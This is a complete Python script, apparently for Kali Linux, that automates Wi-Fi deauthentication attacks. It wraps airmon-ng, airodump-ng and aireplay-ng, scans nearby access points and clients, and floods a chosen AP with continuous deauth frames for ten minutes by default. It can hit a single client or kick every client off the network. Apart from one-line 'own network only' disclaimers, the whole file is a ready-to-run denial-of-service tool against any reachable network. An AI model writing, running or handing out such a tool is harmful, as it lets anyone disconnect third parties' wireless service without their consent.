#!/usr/bin/env python3
"""
mainframe — wifi deauth tool for kali.

wraps airmon-ng / airodump-ng / aireplay-ng with a small interactive picker.
default duration is 10 min, override with -t.

only run on networks you own or have permission to test.
"""

import argparse
import os
import re
import signal
import subprocess
import sys
import time
from pathlib import Path

# ─── colors ───────────────────────────────────────────────────────────────────
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[1m"
D = "\033[2m"
X = "\033[0m"

BANNER = rf"""{G}{B}
  __  __  ___ ___ _  _ ___ ___    _   __  __ ___
 |  \/  |/ _ \_ _| \| | __| _ \  /_\ |  \/  | __|
 | |\/| | (_) | || .` | _||   / / _ \| |\/| | _|
 |_|  |_|\___/___|_|\_|_| |_|_\/_/ \_\_|  |_|___|
{X}{D} wifi deauth · kali · ar9271{X}
"""


# ─── helpers ──────────────────────────────────────────────────────────────────
def need_root():
    if os.geteuid() != 0:
        print(f"{R}needs root. re-run with sudo.{X}")
        sys.exit(1)


def need_tool(tool):
    if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        print(f"{R}missing tool: {tool}{X}")
        print(f"{D}  install with: apt install aircrack-ng wireless-tools iw{X}")
        sys.exit(1)


def list_wireless_interfaces():
    try:
        out = subprocess.check_output(["iw", "dev"], stderr=subprocess.DEVNULL).decode()
    except subprocess.CalledProcessError:
        return []
    return re.findall(r"Interface (\S+)", out)


def pick_interface():
    ifaces = list_wireless_interfaces()
    if not ifaces:
        print(f"{R}no wireless interfaces found. plug in the ar9271?{X}")
        sys.exit(1)
    if len(ifaces) == 1:
        print(f"{D}using {ifaces[0]}{X}")
        return ifaces[0]
    print(f"\n{C}{B}interfaces:{X}")
    for i, name in enumerate(ifaces):
        print(f"  {G}[{i}]{X} {name}")
    while True:
        try:
            choice = int(input(f"\n{G}pick> {X}").strip())
            return ifaces[choice]
        except (ValueError, IndexError):
            print(f"{R}invalid pick{X}")


def start_monitor(iface):
    print(f"{D}killing interfering processes...{X}")
    subprocess.run(["airmon-ng", "check", "kill"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{D}starting monitor mode on {iface}...{X}")
    before = set(list_wireless_interfaces())
    subprocess.run(["airmon-ng", "start", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    after = set(list_wireless_interfaces())
    new = after - before
    if new:
        mon_iface = new.pop()
        print(f"{G}monitor up:{X} {mon_iface}")
        return mon_iface
    # some drivers don't rename — same interface, just different mode
    print(f"{G}monitor up:{X} {iface}")
    return iface


def stop_monitor(iface):
    print(f"\n{D}restoring managed mode...{X}")
    subprocess.run(["airmon-ng", "stop", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "restart", "NetworkManager"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{G}back online.{X}")


# ─── scanning ─────────────────────────────────────────────────────────────────
def scan(iface, seconds):
    """run airodump-ng for N seconds and parse the csv it leaves behind."""
    for p in Path("/tmp").glob("mainframe-scan*"):
        p.unlink()

    out_prefix = "/tmp/mainframe-scan"
    print(f"\n{C}scanning {seconds}s — ctrl-c early if you see your target{X}")
    print(f"{D}(airodump runs silently in background){X}\n")

    proc = subprocess.Popen(
        ["airodump-ng", "--write", out_prefix, "--output-format", "csv", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        for remaining in range(seconds, 0, -1):
            print(f"  {D}{remaining:>3}s remaining...{X}", end="\r")
            time.sleep(1)
    except KeyboardInterrupt:
        print()
    finally:
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
    print()

    csv_path = Path(f"{out_prefix}-01.csv")
    if not csv_path.exists():
        return [], []
    return parse_airodump_csv(csv_path.read_text(errors="ignore"))


def parse_airodump_csv(raw):
    """airodump writes APs, blank line, then clients."""
    sections = re.split(r"\r?\n\r?\n", raw)
    aps, clients = [], []

    if len(sections) < 1:
        return aps, clients

    # APs
    for line in sections[0].splitlines()[1:]:  # skip header
        cells = [c.strip() for c in line.split(",")]
        if len(cells) < 14 or not re.match(r"^[0-9A-Fa-f:]{17}$", cells[0]):
            continue
        essid = cells[13] if cells[13] else "<hidden>"
        aps.append({"bssid": cells[0], "channel": cells[3], "power": cells[8], "essid": essid})

    # Clients
    if len(sections) > 1:
        for line in sections[1].splitlines()[1:]:
            cells = [c.strip() for c in line.split(",")]
            if len(cells) < 6 or not re.match(r"^[0-9A-Fa-f:]{17}$", cells[0]):
                continue
            clients.append({"mac": cells[0], "power": cells[3], "bssid": cells[5]})

    return aps, clients


# ─── pickers ──────────────────────────────────────────────────────────────────
def pick_ap(aps):
    if not aps:
        print(f"{R}no APs found. try scanning longer with -s 30.{X}")
        sys.exit(1)
    # sort by signal strength (less negative = stronger)
    def power_key(ap):
        try: return -int(ap["power"])
        except ValueError: return 9999
    aps = sorted(aps, key=power_key)

    print(f"{C}{B}APs nearby:{X}")
    print(f"  {D}{'#':>3}  {'essid':30}  {'bssid':17}  ch  pwr{X}")
    for i, ap in enumerate(aps):
        essid = ap["essid"][:30] or "<hidden>"
        print(f"  {G}{i:>3}{X}  {essid:30}  {Y}{ap['bssid']}{X}  {ap['channel']:>2}  {ap['power']:>4}")
    while True:
        try:
            choice = int(input(f"\n{G}pick AP> {X}").strip())
            return aps[choice]
        except (ValueError, IndexError):
            print(f"{R}invalid pick{X}")


def pick_client(clients, ap_bssid):
    matching = [c for c in clients if c["bssid"].lower() == ap_bssid.lower()]
    print(f"\n{C}{B}clients seen on this AP:{X}")
    if not matching:
        print(f"  {D}(none — scan was short or they're not transmitting){X}")
    else:
        for i, c in enumerate(matching):
            print(f"  {G}[{i}]{X} {c['mac']}  {D}pwr {c['power']}{X}")
    print(f"  {G}[a]{X} all clients (broadcast deauth, kicks everyone on this AP)")
    while True:
        choice = input(f"\n{G}pick client> {X}").strip().lower()
        if choice == "a":
            return None
        try:
            return matching[int(choice)]["mac"]
        except (ValueError, IndexError):
            print(f"{R}invalid pick{X}")


# ─── deauth ───────────────────────────────────────────────────────────────────
def deauth(iface, ap_bssid, channel, client_mac, duration_min):
    # lock the interface to the AP's channel — otherwise airodump-ng keeps hopping
    subprocess.run(["iwconfig", iface, "channel", channel],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    cmd = ["aireplay-ng", "--deauth", "0", "-a", ap_bssid]
    if client_mac:
        cmd += ["-c", client_mac]
    cmd.append(iface)

    target = client_mac if client_mac else f"all clients on {ap_bssid}"
    end_time = time.time() + duration_min * 60

    print(f"\n{R}{B}>> deauthing {target}{X}")
    print(f"{D}   duration: {duration_min} min  ·  channel {channel}{X}")
    print(f"{D}   ctrl-c to stop early{X}\n")

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while time.time() < end_time:
            remaining = int(end_time - time.time())
            mm, ss = divmod(remaining, 60)
            print(f"  {R}● deauthing... {mm:02d}:{ss:02d} left{X}   ", end="\r")
            time.sleep(1)
        print()
    except KeyboardInterrupt:
        print(f"\n{Y}stopped early{X}")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    print(f"{G}done.{X}")


# ─── main ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="wifi deauth tool")
    parser.add_argument("-t", "--time", type=int, default=10,
                        help="deauth duration in minutes (default 10)")
    parser.add_argument("-s", "--scan-time", type=int, default=15,
                        help="ap scan duration in seconds (default 15)")
    args = parser.parse_args()

    need_root()
    for tool in ["airmon-ng", "airodump-ng", "aireplay-ng", "iw", "iwconfig"]:
        need_tool(tool)

    print(BANNER)
    print(f"{Y}only your own network. you're responsible for what you do.{X}\n")

    iface = pick_interface()
    mon = start_monitor(iface)

    try:
        aps, clients = scan(mon, args.scan_time)
        target_ap = pick_ap(aps)
        target_client = pick_client(clients, target_ap["bssid"])
        deauth(mon, target_ap["bssid"], target_ap["channel"], target_client, args.time)
    finally:
        stop_monitor(mon)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}aborted{X}")
        sys.exit(130)
